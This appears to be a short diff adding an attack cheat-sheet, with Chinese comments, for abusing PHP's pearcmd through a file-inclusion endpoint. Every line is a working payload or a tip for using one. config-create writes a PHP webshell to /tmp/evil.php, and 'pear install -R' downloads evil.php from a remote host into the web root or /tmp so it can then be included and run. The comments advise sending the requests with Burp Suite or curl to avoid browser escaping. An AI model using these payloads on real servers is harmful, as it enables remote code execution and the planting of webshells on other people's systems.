@@ -1,0 +1,10 @@
+ //通过本地直接写入webshell,注意这里最好抓包然后用burpsuite或者直接curl执行，否则浏览器会将< ? > 转义
+ // config-create可以直接创建配置文件，且第一个参数必须以/开头
+ http://ip:port/include.php?f=pearcmd&+config-create+/<?=phpinfo();?>+/tmp/evil.php
+ // 通过远程直接下载webshell
+ // web目录可写
+ - http://ip:port/include.php?f=pearcmd&+install+-R+/var/www/html+http://ip:port/evil.php
+ - http://ip:port/tmp/pear/download/evil.php
+ // tmp目录可写
+ - http://ip:port/include.php?f=pearcmd&+install+-R+/tmp+http://ip:port/evil.php
+ - http://ip:port/include.php?f=/tmp/pear/download/evil
